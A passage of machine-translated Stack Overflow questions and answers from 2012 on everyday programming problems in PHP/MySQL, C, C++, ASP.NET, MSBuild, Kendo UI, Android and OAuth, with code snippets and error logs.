if($result == false)
{
   user_error("Query failed: " . mysql_error() . "<br />\n$query");
}
elseif(mysql_num_rows($result) == 0)
{
   echo "<p>Sorry, we're updating this section of our website right now!</p>\n";
}
else
{
   while($query_row = mysql_fetch_assoc($result))
   {
      foreach($query_row as $key => $domain)
      {
         echo "$value";
      }
   }
}  
?>
<item>
    <title><?php echo $domain; ?> REVIEW</title>
    <pubDate><?echo date('Y/m/d H:i:s');?></pubDate>
    <link>http://www.mywebsite.com/review/<?php echo $domain; ?></link>
    <description>Looking for a review on <?php echo $domain; ?>?  We've got it!</description>
</item>
<?php endforeach; ?>

</channel>
</rss> 
```

提前感谢任何人都可以提供的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:35:21.023

您仍然可以一次选择全部 30 个。获得 30 条记录应该不会那么慢。

```
$numbers=array();
foreach( range( 1, 30 ) as $i ):
    $numbers[] = mt_rand( 1, 141754641 );
endforeach;

$query="SELECT * FROM `list` WHERE `whatever_primary_key_is` IN (".implode(',', $numbers).")"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:52:14.300

Limit 必须进行表扫描，因此您要做的是使用索引来发挥自己的优势。所以首先，让我们在名为“id”的表中添加一个自动增量 ID 字段。

然后，

```
<?php
$result = array();
$maxRow = mysql_fetch_assoc(mysql_query("SHOW TABLE STATUS LIKE 'list';"));
$max = $maxRow["Auto_increment"];
$minRow = mysql_fetch_assoc(mysql_query("SELECT id FROM 'list' LIMIT 1;"));
$min = $minRow["id"];
while (count($result) < 30) {
    $ids = array();
    while (count($ids) < 100) {
        $id = mt_rand($min, $max);
        $ids[$id] = 1;
    }
    $res = mysql_query("SELECT * from 'list' WHERE id IN (" . join(',', array_keys($ids)) . ") LIMIT 30");
    while (($row = mysql_fetch_assoc($result)) && (count($result) < 30)) {
        $result[] = array( ... ); // stuff results here
    }
}

// output
?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-25T07:11:36.953

我可以建议一个更强大的方法。

1.  您必须考虑到您要查找的号码可能不存在
2.  只使用一个 MySql 查询通常更快

基于[**url1**](http://davidwalsh.name/mysql-random)和**[url2](http://www.carlj.ca/2007/12/16/selecting-random-records-with-sql/)**

您可以使用此 php 代码：

```
<?php
// Connecting, selecting database
   $link = mysql_connect('mysql_host', 'mysql_user', 'mysql_password') or die('Could not connect: ' . mysql_error());
   mysql_select_db('my_database') or die('Could not select database');

$query = "SELECT `url`
          FROM `liste`
          ORDER BY RAND()
         LIMIT 30" ;

$result = mysql_query($query);

if($result == false)
{
   user_error("Query failed: " . mysql_error() . "<br />\n$query");
}
elseif(mysql_num_rows($result) == 0)
{
   echo "<p>Sorry, we're updating this section of our website right now!</p>\n";
}
else
{  $query_row = array();
   while($query_row = mysql_fetch_assoc($result))
    { 
        echo $query_row['url']; // no need to do the extra foreach
     }
 }

?> 
```

值 mysql_host,mysql_user,mysql_password,my_database 应替换为您的连接。

只要您的**标题**表中有 30 行，就可以了。

# c++ - 向量内的不可修改值？

> ID：13548838
> 
> 赞同：1
> 
> 时间：2012-11-25T06:27:19.437
> 
> 标签：c++, vector, struct

我有以下数据结构：

```
struct file{
    char  name[MAX_FILE_NAME];
    char  data[BLOCK_SIZE - MAX_FILE_NAME]
};

struct disk{
    vector<file> current_file;
}; 
```

当我尝试修改我创建的任何磁盘的索引 0 中的内容时，如下所示：

```
disk new_disk;

new_disk.current_file[0].name = "new name"; 
```

我得到的错误是`expression must be a modifiable |value`

我觉得已经很晚了，我似乎无法理解一些简单的事情......但为什么这不起作用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T06:30:44.090

你不能分配这样的数组，例如

```
char foo[500];
foo = "this won't work"; 
```

您必须使用类似的功能`strcpy`

```
strcpy(new_disk.current_file[0].name, "new name"); 
```

`strncpy`会更安全，`std::string`甚至会更安全。

# html - 从 wordpress 网站中删除右侧的空格

> ID：13548843
> 
> 赞同：0
> 
> 时间：2012-11-25T06:28:19.170
> 
> 标签：html, css, wordpress

刚刚在[http://www.thefunnyglobe.com/](http://www.thefunnyglobe.com/)为我的公司建立了一个站点，我注意到一个奇怪的问题。它在右侧有很大的空白区域。任何人都可以帮忙吗？想不通。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:32:41.387

`width: 1100px`从`.content`班级中删除。最有可能的是，您正在使用`class="content"`您的列表项以及页面。您可能应该重命名其中一个类。

# c# - Login 和 LoginStatus 目标 URL 无法正常工作

> ID：13548847
> 
> 赞同：4
> 
> 时间：2012-11-25T06:29:22.683
> 
> 标签：c#, asp.net, url, login-control, loginstatus

我正在创建的网站有一个部分用于未经过身份验证的用户，另一个部分用于经过身份验证的用户。

（几乎）站点中的每个页面都有一个 LoginStatus 控件，该控件位于标题中，并根据状态显示为 2 个不同的按钮。

我遇到的问题是，尽管该控件中的 LogoutPageUrl 值设置为值“~login.aspx”，但对于站点的非身份验证文件夹中的页面，站点仅刷新页面但控件确实显示用户通过在控件中显示正确的图像来注销。当再次单击该控件时，您将被定向到登录页面。

这是控制：

```
 <asp:LoginStatus CssClass="loginControlBtn" ID="LoginStatus2" 
    runat="server" LogoutPageUrl="~/login.aspx" 
    LoginImageUrl="~/images/LoginBtn.jpg"
    LogoutImageUrl="~/images/LogoutBtn.jpg" /> 
```

此外，单击 LoginStatus 控件上的登录选项并再次登录后，您不会被定向到 Login 控件中指定的页面，而是最终回到您在 LoginStaus 控件上选择 Login 选项时所在的页面.

这是该登录控件的代码：

```
 <asp:Login ID="helpDeskLoginCtrl" runat="server" 
            DestinationPageUrl="~/admin/HelpDeskOptions.aspx" 
            style="text-align: justify" VisibleWhenLoggedIn="False" Width="421px">
        </asp:Login> 
```

该站点使用表单身份验证，因此只有经过身份验证的用户才能查看“〜/ admin”文件夹中的页面..并且至少该部分可以正常工作，因为在该文件夹中的页面上您被定向到“ ~/login.aspx”页面。

但是当你再次登录而不是去

```
DestinationPageUrl="~/admin/HelpDeskOptions.aspx 
```

正如在登录控件中指定的那样，您将被引导回您来自的页面。

我真的很难过。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:12:12.010

好吧，我的一位大学老师帮助我解决了这个问题的实际答案，虽然我不能对此表示赞赏，但我在这里提出它是为了帮助可能遇到同样问题的其他人。

导致我的问题的属性是“LogoutAction”控件。

在我使用的 VS 版本（2010）中，默认值为“Refresh”，而需要将其更改为“Redirect”，以便始终转到“LogoutPageURL”控件中指定的页面并且不从何处返回你是在重新登录后来的。

希望这可以帮助某人，菲尼克斯

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T22:52:45.610

此页面应提供有关 LoginStatus 类的答案 - [http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.loginstatus.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.loginstatus.aspx)

您需要检查 Page 对象的 IsAuthenticated 属性。

# c - 提供的代码中的“取消引用指向不完整类型的指针”

> ID：13548848
> 
> 赞同：0
> 
> 时间：2012-11-25T06:29:31.733
> 
> 标签：c, compiler-errors, stack

我正在尝试使用教科书作者给我的代码编写程序，但是在尝试编译使用该文件的程序时，每种方法都出现“取消引用指向不完整类型的指针”错误。下面是代码。有谁知道我如何修复这个作者的代码以使其正常工作？

```
#include <stdio.h>
#include <stdlib.h>
#include "StackADT.h"
#define STACK_SIZE 100

struct stackType {
    int contents[STACK_SIZE];
    int top;
};

static void terminate(const char *message) {
    printf("%s\n", message);
    exit(EXIT_FAILURE);
}

Stack create(void) {
    Stack s = malloc(sizeof(struct stackType));

    if (s == NULL) {
        terminate("Error: Stack could not be created");
    }

    s->top = 0;
    return s;
}

void destroy(Stack s) {
    free(s);
}

void makeEmpty(Stack s) {
    s->top = 0;
}

bool isEmpty(Stack s) {
    return s->top == 0;
}

bool isFull(Stack s) {
    return s->top == STACK_SIZE;
}

void push(Stack s, Item i) {
    if (isFull(s)) {
        terminate("Error: Stack is full");
    }

    s->contents[s->top++] = i;
}

int pop(Stack s) {
    if (isEmpty(s)) {
        terminate("Error: Stack is empty");
    }

    return s->contents[--s->top];
} 
```

错误：

```
StackADT.c: In function 'create':
StackADT.c:29: error: dereferencing pointer to incomplete type
StackADT.c: In function 'makeEmpty':
StackADT.c:38: error: dereferencing pointer to incomplete type
StackADT.c: In function 'isEmpty':
StackADT.c:42: error: dereferencing pointer to incomplete type
StackADT.c: In function 'isFull':
StackADT.c:46: error: dereferencing pointer to incomplete type
StackADT.c: In function 'push':
StackADT.c:54: error: dereferencing pointer to incomplete type
StackADT.c:54: error: dereferencing pointer to incomplete type
StackADT.c: In function 'pop':
StackADT.c:62: error: dereferencing pointer to incomplete type
StackADT.c:62: error: dereferencing pointer to incomplete type 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:31:44.537

尝试在`typedef struct stackType *Stack;`第一个函数定义之前挤进去，看看是否能解决它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:46:58.440

您正在使用先前声明的指针类型`Stack`作为`struct stackType *`. 实际上`Stack`与 没有关系`struct stackType *`。你`Stack`被声明为 的同义词`SomeOtherType *`，其中`SomeOtherType`是一些不完整的类型。

你的`Stack`声明在哪里？它说什么？

# msbuild - MSBuild UsingTask Resolve References

> ID：13548851
> 
> 赞同：23
> 
> 时间：2012-11-25T06:30:12.663
> 
> 标签：msbuild, msbuild-task

我觉得我以前已经解决过这个问题，但我不记得是如何解决的。

我有一个看起来像这样的任务文件（CustomTasks.tasks）：

```
<UsingTask AssemblyFile="CustomTasks.dll" TaskName="MyCustomTask"/> 
```

它引用了一个程序集（即 Ionic.Zip.dll）。Ionic.Zip.dll 不在 GAC 中（我不希望它在）。它就在我的 CustomTasks.dll 旁边。

我的 sln 文件有一个名为 MSBuild 的目录，其中包含 CustomTasks.tasks、CustomTasks.dll 和 Ionic.Zip.dll。

我有一个引用任务文件并调用自定义任务的 csproj：

```
<Import Project="$(ProjectDir)\..\MSBuild\CustomTasks.tasks" />

<MyCustomTask ..... /> 
```

在构建时，这会产生：

无法从程序集 ....MyCustomTasks.dll 加载“MyCustomTask”任务。无法加载文件或程序集“Ionic.Zip，......”或其依赖项之一。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-11-25T07:07:08.407

感到疲倦和沮丧并采取了直接的方法......我认为这与我之前解决问题的方式不同......但这也许会对其他人有所帮助。其他更优雅的解决方案非常受欢迎。

```
 <Target Name="BeforeBeforeBuild" BeforeTargets="BeforeBuild">
    <HandleAssemblyResolve SearchPath="$(ProjectDir)\..\MSBuild\" />
  </Target>
  <UsingTask TaskName="HandleAssemblyResolve" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup>
      <SearchPath ParameterType="System.String" Required="true" />
    </ParameterGroup>
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.IO" />
      <Using Namespace="System.Reflection" />
      <Code Type="Fragment" Language="cs">
        <![CDATA[
AppDomain.CurrentDomain.AssemblyResolve += (sender, e) => 
{ 
  var assemblySearchPath = Path.Combine(SearchPath, e.Name.Split(',')[0]);
  if (File.Exists(assemblySearchPath)) return Assembly.LoadFrom(assemblySearchPath);

  return null;
};
]]>
      </Code>
    </Task>
  </UsingTask> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-03-16T13:02:14.680

这实际上很容易解决。将您的自定义构建任务和依赖项放在不同的文件夹中。然后正确加载依赖项。

例如像这样：

```
<UsingTask AssemblyFile="..\BuildTools\CustomTasks.dll" TaskName="MyCustomTask"/> 
```

# safari - HTML5 视频可在 iPhone iOS 上播放，但不能在桌面 Safari 上播放

> ID：13548852
> 
> 赞同：1
> 
> 时间：2012-11-25T06:30:15.100
> 
> 标签：safari, html5-video, typo3

我正在开发一个 Typo3 网站并安装了“html5videoplayer”扩展。然后我添加了 MP4、.ogg 和 webm 格式的视频，因为这应该涵盖所有浏览器以及 iPhone/iPad。但是，它可以在 iPhone/iPAD 以及 chrome、opera、firefox 和 IE 上运行，但不能在 SAFARI 上运行！

这是html：

```
<div class="video-js-box ">
<video id="video_1" class="video-js " width="960" height="450" data-setup="{}" controls="" autoplay="" preload="auto" tabindex="0">
<source type="video/mp4" src="fileadmin/Videos/Canebio_Korr.mp4"></source>
<source type="video/webm" src="fileadmin/Videos/canebio_mobile.webm"></source>
<source type="video/ogg" src="fileadmin/Videos/Canebio_Korr.ogg"></source>
</video>
<p class="vjs-no-video"> </p>
</div> 
```

任何建议，想法将不胜感激。您也可以在[http://tinyurl.com/c7gunen查看该网站](http://tinyurl.com/c7gunen)

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-10T21:59:01.370

服务器发送的文件是否具有正确的 mime 类型？

.htacces 在包含视频文件的文件夹中：

```
AddType video/ogg .ogv
AddType video/mp4 .mp4
AddType video/webm .webm 
```

# c - 如何使用两个不同的接口在客户端打开两个套接字

> ID：13548853
> 
> 赞同：2
> 
> 时间：2012-11-25T06:30:17.587
> 
> 标签：c, sockets

我必须通过 eth0 和 eth1 传输数据。所以我在客户端编写了一个代码，其中我使用线程打开了两个套接字。但它不能正常工作意味着它没有连接 eth1（连接错误）。数据仅通过 etho 发送。
注意：这里我使用两个独立的网络。这是我的代码。请通过这个...

```
void Socket_1()
{

    struct sockaddr_in ser_sock1 ;
    u_int yes=1 ;
    int setsock_fd ;
    ser_sock1.sin_family = AF_INET ;
    ser_sock1.sin_port = htons( 1602 ) ;
    ser_sock1.sin_addr.s_addr =inet_addr("192.168.1.35")            
    cl_fd1 = socket(AF_INET,SOCK_STREAM,0) ;
    if (cl_fd1 == -1) 
    {
        printf("Socket1 : ERROR\n") ;
        return ;
    }
    /* Bind to socket*/
    if( bind(cl_fd1,(struct sockaddr *)&ser_sock1 , sizeof(ser_sock1)) < 0)
    {
        printf("bind1 : ERROR\n") ;
        return ;
    }

    /* Construct the server sockaddr_in structure */
    memset(&ser_sock1, 0, sizeof(ser_sock1));       /* Clear struct */
    ser_sock1.sin_family = AF_INET ;
    ser_sock1.sin_port = htons( 22008 ) ;
    ser_sock1.sin_addr.s_addr = inet_addr("192.168.1.151") ;
    /*connect to destination*/
    con_fd1 = connect(cl_fd1, (struct sockaddr *)(&ser_sock1), sizeof(ser_sock1));
    if(con_fd1 < 0)
    {
        printf("connect1 : ERROR\n") ;
        while(1)
        {
        }
        return ;
    } 
    g_socketCreated = 1 ;
    while(g_socketCreated)
    {
        sprintf( buff, "Mess-%08X", count++ );
        send( cl_fd1, buff, strlen(buff), 0x0 ) ;
        sleep(1) ;
    }
}

void Socket_2(void)
{

    struct sockaddr_in ser_sock2, ser_sock3 ;   
    ser_sock2.sin_family = AF_INET ;
    ser_sock2.sin_port = 0 ;
    ser_sock2.sin_addr.s_addr = inet_addr("192.168.42.130") ;
    cl_fd2 = socket(AF_INET,SOCK_STREAM,0) ;
    if (cl_fd2 == -1) 
    {
        printf("Socket2 : ERROR\n") ;
        return ;
    }
    /* Bind to socket*/
    if( bind(cl_fd2,(struct sockaddr *)&ser_sock2 , sizeof(ser_sock2)) < 0)
    {
        printf("bind2 : ERROR\n") ;
        return ;
    }

    /* Construct the server sockaddr_in structure */
    memset(&ser_sock3, 0, sizeof(ser_sock3));       /* Clear struct */
    ser_sock3.sin_family = AF_INET ;
    ser_sock3.sin_port = htons( 22000 ) ;
    ser_sock3.sin_addr.s_addr = inet_addr("110.234.115.27") ;

    /*connect to destination*/
    con_fd2 = connect(cl_fd2, (struct sockaddr *)(&ser_sock3), sizeof(ser_sock3));
    if(con_fd2 < 0)
    {
        printf("connect2 : ERROR\n") ;
        return ;
    } 
    g_socketCreated1 = 1 ;
    while(1)
    {
        sprintf( buff1, "soc2---Mess-%08X", count1++ );
        send( cl_fd2, buff1, strlen(buff1), 0x0 ) ;
        sleep(1) ;
    }       
} 
```

# telerik-grid - Kendo UI Grid 模板在 Firefox 和 Chrome 中不起作用

> ID：13548857
> 
> 赞同：1
> 
> 时间：2012-11-25T06:31:06.937
> 
> 标签：telerik-grid, kendo-ui, jqgrid

我在 Kendo UI 中有一个 Grid 模板，如下所示：

```
<script id="rowTemplate" type="text/x-kendo-tmpl">
<tr class="row-template">
    <td style="width:80px">
        <div rowspan="4"><img src="../../Images/picture_temp.jpg" class="display_searchresults_picture"/></div>
    </td>
    <td>
        <div class="display_searchresults_name"><a href="">#= FirstName # #= LastName # </a></div>
        <div align="right" width="100px">* * * * *(4.5)</div>                       
        # for (var i = 0; i < Education.length; i++) { #      
            <div class="display_searchresults_address">#= Address.City #, #= Address.State # | #= Education[i].School.Name #</div>         
            # for (var j = 0; j < Education[i].Major.length; j++) { #          
                <div class="display_searchresults_info">#= Education[i].Major[j].Name # | #= Education[i].GraduationDate.Year # | 3.5-3.75</div>              
            # } #
        # } #                                                                                         
        <div class="display_searchresults_desc" colspan="2">#= Description #<a href="">...</a></div>         
    </td>
</tr> 
```

这个模板在 IE 9 中就像一个魅力，但在 Firefox 中它呈现为：

```
#= FirstName # #= LastName #
* * * * *(4.5)
# for (var i = 0; i < Education.length; i++) { #
#= Address.City #, #= Address.State # | #= Education[i].School.Name #
# for (var j = 0; j < Education[i].Major.length; j++) { #
#= Education[i].Major[j].Name # | #= Education[i].GraduationDate.Year # | 3.5-3.75
# } # # } #
#= Description #... 
```

基本上，它呈现为代码，而不是 html。

至于 Chrome，网格根本不会在那里渲染。如何使 Kendo UI Grid 模板适用于其他浏览器？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T09:15:05.200

您好，您的模板似乎工作正常。这是[JsBin](http://jsbin.com/edamuj/91/edit)的实际应用。

您可以检查控制台以查看在使用数据时是否有任何 JavaScript 错误。如果未定义任何字段（例如 Education），则可能会破坏模板。

# c++ - 显示具有多个类的链表？

> ID：13548858
> 
> 赞同：1
> 
> 时间：2012-11-25T06:31:07.337
> 
> 标签：c++, linked-list

我不确定为什么我的显示功能不起作用。我`cout`的陈述是这样说的

```
no match for operator << in std :: cout<<n->movieinventory::movienode::m 
```

有任何想法吗？

```
class MovieInventory
{
 private:
 struct MovieNode          // the Nodes of the linked list
  {
     Movie m;              // data is a movie
     MovieNode *next;      // points to next node in list
  };

  MovieNode *movieList;    // the head pointer

  bool removeOne(Movie);   // local func, used by sort and removeMovie

  public:
  MovieInventory();

  bool addMovie(Movie);
  int removeMovie(Movie);
  void showInventory();
  Movie findMinimum();   // should be private, but public for testing
  void sortInventory();

  int getTotalQuantity();
  float getTotalPrice();

}; 
```

显示代码：

```
void MovieInventory::showInventory()
{

MovieNode *n;

    for (n = movieList; n != NULL; n = n->next)
    cout <<  n->m;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T06:36:16.147

数据成员`m`属于`Movie`该类。`cout`with`<<` [运算符](http://www.cplusplus.com/reference/ostream/ostream/operator%3C%3C/)仅对 int、char、float 等内置数据类型进行重载。因此它不会输出用户定义数据类型的对象。`<<`为此，您必须为自己的类重载运算符。

如果不想重载运算符 <<，则必须以这种方式将 Movie 类的数据成员一一输出，前提是它们是 publicy 声明的。

```
cout << n->m.var1 ;
cout << n->m.var2 ; 
```

如果 Movie 类的数据成员是私有的，则必须为此创建 getter 函数。

```
cout << n->m.getvar1() ;
cout << n->m.getvar2() ; 
```

# php - PHP电子邮件管道获取“到”字段

> ID：13548859
> 
> 赞同：1
> 
> 时间：2012-11-25T06:31:11.663
> 
> 标签：php, stdin, piping

我正在尝试将电子邮件管道与 PHP 一起使用。

我有它的工作，除了我不能得到“到”字段。

我正在使用以下 PHP 代码：

```
#!/usr/bin/php -q
<?php

// read from stdin
$fd = fopen("php://stdin", "r");
$email = "";
while (!feof($fd))
{
    $email .= fread($fd, 1024);

    $to1 = explode ("\nTo: ", $email);
    $to2 = explode ("\n", $to1[1]);
    $to = str_replace ('>', '', str_replace('<', '', $to2[0]));

}
fclose($fd);

mail('email@example.com','From my email pipe!','"' . $to . '"');

?> 
```

如果我使用电子邮件地址（例如：john@smith.com）并将电子邮件发送到我的电子邮件地址，该电子邮件地址会转发到我的 PHP 管道脚本 (pipe.php)，我希望它能够获取电子邮件的发送人到。

例如：john@smith.com 将我的转发电子邮件发送到我的 PHP 管道脚本 (bob@example.com) 我希望它只返回 bob 部分而没有 @example.com

现在发生的是它返回整个电子邮件地址，例如“bob@example.com”，我希望它只返回 bob（没有任何谈话标记）。

我试过用这个：

```
$to = $to.split("@"); 
```

但我似乎收到一条错误消息： split() 需要至少 2 个参数。这将发送给发送电子邮件的人。

有谁知道该怎么做或知道我可能做错了什么？

这是我第一次在 PHP 中使用管道，所以如果我做错了什么，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T07:03:41.083

最终使用：

```
$to1 = explode ("\nTo: ", $email);
$to2 = explode ("\n", $to1[1]);
$to = str_replace ('>', '', str_replace('<', '', $to2[0]));
list($toa, $tob) = explode('@', $to); 
```

然后将邮件更改为：

```
mail('email@example.com','From my email pipe!','"' . $toa . '"'); 
```

# ruby-on-rails - 使用 ruby on rails 框架的基于 Soap 的 Web 服务

> ID：13548861
> 
> 赞同：0
> 
> 时间：2012-11-25T06:31:37.993
> 
> 标签：ruby-on-rails

是否可以使用 ruby​​ on rails 框架编写基于肥皂的 Web 服务。如果是的话，有人可以指出一个学习资源

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T08:00:05.717

是的，您可以使用 Rails 编写 SOAP Web 服务，但是 Rails 正在转向支持 REST Web 服务方法。所以我个人的看法是，如果你正在使用 SOAP Web 服务启动一个全新的 Rails 应用程序，请考虑使用其他编程语言，例如 JAVA，因为它有更多工具可以轻松创建 SOAP Web 服务。

但是现在所有的 Web 服务都转向 REST，因为它具有简单性。几乎所有主要站点都有 REST API。

此外，如果您仍打算继续使用 Rails，那么[savon](http://savonrb.com/)是一个有趣的宝石，您可能应该看看。

# asp.net-mvc-4 - ASP.NET MVC 4 OAuthWebSecurity 不工作

> ID：13548865
> 
> 赞同：4
> 
> 时间：2012-11-25T06:32:27.173
> 
> 标签：asp.net-mvc-4, dotnetopenauth, .net-4.5

在我的 ASP.NET mvc 4 应用程序中，我尝试实现 我配置的**Account/ExternalLogin ，**

1.  微软（Windows Live），
2.  不幸的是，具有 ClientID 和 ClientSecret 并启用了 GoogleOpenAuth 的 Facebook 没有任何效果。

    Url call: provider=microsoft& **sid** =95b923de889e4a4db6861c98fafb42a3&code=f85770b1-266b-3abd-4c46-8d62fe3014dc">http://mydomain.com/account/externallogincallback? **provider** =microsoft& **sid** =95b923de889e4a4db6861c98fafb42a3&code=f85770b1-266b-3abd-4c46-8d62fe3014dc

    AuthenticationResult 结果 = OAuthWebSecurity.VerifyAuthentication(Url.Action("ExternalLoginCallback", new { ReturnUrl = returnUrl }));

所有 OpenAuth 调用均失败，Google 将返回身份验证错误，Facebook 和 Microsoft（Windows Live）给出 400 错误请求响应。

任何人都可以建议如何解决这个问题？

更多细节：这些是我使用的 DLL

1.  C:\Users\UserName\Documents\Visual Studio 2012\Projects\myProject\packages\DotNetOpenAuth.AspNet.4.0.3.12153\lib\net40-full\DotNetOpenAuth.AspNet.dll
2.  C:\Users\UserName\Documents\Visual Studio 2012\Projects\myProject\packages\DotNetOpenAuth.Core.4.0.3.12153\lib\net40-full\DotNetOpenAuth.Core.dll
3.  C:\Users\UserName\Documents\Visual Studio 2012\Projects\myProject\packages\DotNetOpenAuth.OAuth.Core.4.0.3.12153\lib\net40-full\DotNetOpenAuth.OAuth.dll
4.  C:\Users\UserName\Documents\Visual Studio 2012\Projects\myProject\packages\DotNetOpenAuth.OpenId.Core.4.0.3.12153\lib\net40-full\DotNetOpenAuth.OpenId.dll
5.  C:\Users\UserName\Documents\Visual Studio 2012\Projects\myProject\packages\DotNetOpenAuth.OpenId.RelyingParty.4.0.3.12153\lib\net40-full\DotNetOpenAuth.OpenId.RelyingParty.dll

网页配置

```
 <compilation debug="true" targetFramework="4.5" >
      <assemblies>
        <add assembly="WebMatrix.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"/>
        <add assembly="WebMatrix.WebData, Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"/>
      </assemblies>
    </compilation> 
```

发现了问题：好吧，我想通了，我在应用程序启动时触发了一个自定义函数，它将强制将完整的 url 小写，当 OAuth 令牌被回调到 Facebook 时，令牌值也小写，这造成了问题. 很高兴我能找到它:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T17:34:08.673

在没有看到真实代码的情况下不太确定是什么原因，但请仔细检查您传递给 RequestAuthentication() 的返回 url 是否与传递给 VerifyAuthentication() 的返回 url 完全相同

# filter - Google CSE v2 过滤器示例

> ID：13548870
> 
> 赞同：1
> 
> 时间：2012-11-25T06:33:07.390
> 
> 标签：filter, google-custom-search

我试图到处寻找解释如何通过 javascript 或 querstring 将过滤器添加到搜索结果的示例。CSE v2 不是 1。

类似于[https://www.nrd.gov/jobSearch/list/jobSearch?q=test&moc=&location=&_includeNearbyCities=&datePosted=31&title=&hiringOrganization=&employmentType=full+time&baseSalary=&experienceRequirements=&qualifications=&submit=Find+Jobs&order=asc&sort =jobposting-dateposted](https://www.nrd.gov/jobSearch/list/jobSearch?q=test&moc=&location=&_includeNearbyCities=&datePosted=31&title=&hiringOrganization=&employmentType=full+time&baseSalary=&experienceRequirements=&qualifications=&submit=Find+Jobs&order=asc&sort=jobposting-dateposted)您可以在左侧看到过滤选项

谢谢

# android - Android 闹钟未设置

> ID：13548871
> 
> 赞同：1
> 
> 时间：2012-11-25T06:33:16.750
> 
> 标签：android, android-service, alarmmanager

我尝试在我的 android 设备中通过 eclipse 运行此代码。但它没有设置警报。已添加 Android 权限。可能是什么问题！

```
Calendar cal = Calendar.getInstance();
cal.add(Calendar.SECOND, 5);

Intent intent = new Intent(this.context, AlarmAction.class);
PendingIntent pendingintent = PendingIntent.getBroadcast(this.context, 0, intent, 0);

this.alarmManager.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pendingintent); 
```

# android - 定位 android 数据库未引用的孤立文件

> ID：13548874
> 
> 赞同：0
> 
> 时间：2012-11-25T06:33:31.090
> 
> 标签：android, database, sqlite, android-contentprovider, file-management

我有一个内容提供程序，它有一个 _data 列，`_data column`存储对创建文件的引用，当行被删除时，文件有时会被遗忘。

查找和删除 SQLite 数据库当前未引用的孤立文件的最佳方法是什么？

我能想到的唯一解决方案是遍历图像存储目录中的文件，并检查该文件是否存在于数据库中，但这似乎很慢，因为它需要对数据库进行多次查询；

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T11:56:59.223

> 我能想到的唯一解决方案是遍历图像存储目录中的文件，并检查该文件是否存在于数据库中，但这似乎很慢，因为它需要对数据库进行多次查询；

没有更好的方法，因为您想删除您不知道的文件。所以你首先要了解它们的存在，而扫描文件夹是唯一的方法

# php - Android PHP连接错误

> ID：13548882
> 
> 赞同：1
> 
> 时间：2012-11-25T06:35:18.407
> 
> 标签：php, android, runtime-error

我正在尝试建立最终通过 Web 服务将 Android 应用程序连接到数据库。作为中间步骤，我试图查看是否可以让[http://codeoncloud.blogspot.com/2012/07/android-php-web-service-client.html](http://codeoncloud.blogspot.com/2012/07/android-php-web-service-client.html)正常工作。但是，当我复制/粘贴它并使用 textview 设置适当的布局文件时，尝试运行它时出现错误。具体来说，我的代码如下所示（我试图从同一台机器上的模拟器运行，因此是 10.0.2.2）任何指针将不胜感激！

```
package com.example.componenttest;

import android.app.Activity;
import android.os.Bundle;
import java.io.IOException;
import android.widget.TextView;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class AndroidWebActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost("10.0.2.2/InterfaceTest/GrabMe.php");
        try {
            TextView tv = (TextView) findViewById(R.id.tv1);
        //tv.setText("CHANGED TEXT");
            HttpResponse response = httpclient.execute(httppost);
            final String str =  EntityUtils.toString(response.getEntity());
            tv.setText(str);
        }
       catch (IOException e) {
           // TODO Auto-generated catch block
           e.printStackTrace();
        }
    }
} 
```

我的错误日志如下所示：

```
11-24 22:30:14.976: D/dalvikvm(7269): GC_EXTERNAL_ALLOC freed 53K, 48% free 2807K/5379K, external 1687K/2079K, paused 221ms  
11-24 22:30:17.890: D/AndroidRuntime(7269): Shutting down VM  
11-24 22:30:17.890: W/dalvikvm(7269): threadid=1: thread exiting with uncaught exception (group=0x4001e578)  
11-24 22:30:17.921: E/AndroidRuntime(7269): FATAL EXCEPTION: main  
11-24 22:30:17.921: E/AndroidRuntime(7269): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.componenttest/com.example.componenttest.AndroidWebActivity}: java.lang.IllegalStateException: Target host must not be null, or set in parameters.  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1651)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1667)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.app.ActivityThread.access$1500(ActivityThread.java:117)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:935)  
11-24 22:30:17.921: E/AndroidRuntime(7269):     at android.os.Handler.dispatchMessage(Handler.java:99)  
